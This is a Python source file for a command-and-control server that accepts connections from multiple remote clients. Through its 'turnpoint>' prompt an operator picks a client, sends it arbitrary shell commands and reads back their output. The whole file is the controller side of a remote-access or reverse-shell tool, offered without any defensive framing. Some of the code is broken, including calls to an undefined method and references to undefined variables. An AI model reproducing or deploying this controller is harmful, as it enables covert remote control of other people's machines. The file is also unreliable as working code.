import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal

TOTAL_THREADS = 2
JOBS = [1,2]
queue = Queue()

import os
  
# Get the process ID of
# the current process

  
  
# Print the process ID of
# the current process
# print(pid)


COMMANDS = {'list':['Lists connected clients'],
            'select':['selects a client by its index, takes index as param']
            }


class Command_Control():

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.connections = []
        self.IP_addresses = []

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def createSocket(self):
        ''' Create Socket '''
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print(f"Error in creating socker: {e}")
            sys.exit(1)
        
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return
    
    def bindSocket(self):
        ''' Bind Socket to Host & Port and wait for Client to connect '''
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)   # Allow upto 5 clients to connect
        except socket.error as e:
            print(f"Error in binding socket: {e}")
            time.sleep(5)
            self.socket_bind()
        return

    def acceptClientConnection(self):
        ''' Accept connections from multiple clients and save to list '''
        for conn in self.connections:
            conn.close()
        
        self.connections = []
        self.IP_addresses = []

        keepRunning = True
        while keepRunning:
            try:
                conn, addr = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                addr = addr + (client_hostname,)
            except Exception as e:
                print(f"Error Accepting Connection: {e}")
                continue
            self.connections.append(conn)
            self.IP_addresses.append(addr)
            print(f"Connection Established : {addr[-1]} ({addr[0]})")
        return

    def start_turnPoint(self):
        ''' Interactive Shell for Sending Commands Remotely '''
        keepRunning = True
    
        while keepRunning:
            cmd = input("turnpoint> ")
            if cmd == 'list': 
                self.showConnections()
                continue
            elif 'select' in cmd:
                target, conn = self.getTarget(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif 'tp' in cmd:
                self.showConnections()
                continue
            elif cmd == 'shutdown':
                queue.task_done()
                queue.task_done()
                print('Server has Shutdown')
                break
            elif cmd == '':
                pass
            else:
                print('Invalid Command')
        
        return

    
    def showConnections(self):
        ''' List all Connections '''
        ALL_CONN = ''

        for id, conn in enumerate(self.connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.connections[i]
                del self.IP_addresses[i]
                continue

            ALL_CONN += str(id) + '  ' + str(self.IP_addresses[id][0]) + '   ' + str(self.IP_addresses[id][1]) + '   ' + str(self.IP_addresses[id][2]) + '\n'
        
        print('-'*5 + ' CLIENTS ' + '-'*5 + '\n' + ALL_CONN)
        return

    def getTarget(self, cmd):
        ''' Select Target Client '''
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client ID should be Int')
            return None, None
        try:
            conn = self.connections[target]
        except IndexError:
            print('Invalid ID')
            return None, None
        
        print(f'Connected to {self.IP_addresses[target][2]}')
        return target, conn

    def readCmdOutput(self, conn):
        ''' Read msg length, unpack into an int '''
        raw_msgLen = self.recvall(conn, 4)
        if not raw_msgLen:
            return None
        msgLen = struct.unpack('>I', raw_msgLen)[0]
        # Read Message
        return self.recvall(conn, msgLen)

    def recvall(self, conn, n):
        ''' Reveive and Read n bytes '''
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data


    def send_target_commands(self, target, conn):
        ''' command & control target client '''
        conn.send(str.encode(' '))
        cwd_bytes = self.readCmdOutput(conn)
        cwd = str(cwd_bytes, 'utf-8')
        print(cwd, end = "")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.readCmdOutput(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
            except Exception as e:
                print("Connection was lost %s" %str(e))
                break

        del self.connections[target]
        del self.IP_addresses[target]
        return

    def TIMEPASS(self):
        os.system("echo LMAO THIS IS WORKING OR NOT?")



def createWorkers():
    ''' Create worker threads which will be killed when main thread exits '''
    server = Command_Control()
    server.register_signal_handler()
    for _ in range(TOTAL_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return

def work(server):
    ''' Do the next job in queue '''
    while True:
        x = queue.get()
        if x == 1:
            server.createSocket()
            server.bindSocket()
            server.acceptClientConnection()
        if x == 2:
            server.start_turnPoint()

        queue.task_done()
    return

def createJOBS():
    ''' Each List item is a New Job '''
    for x in JOBS:
        queue.put(x)
    queue.join()
    return

def main():
    createWorkers()
    createJOBS()

if __name__ == '__main__':
    main()





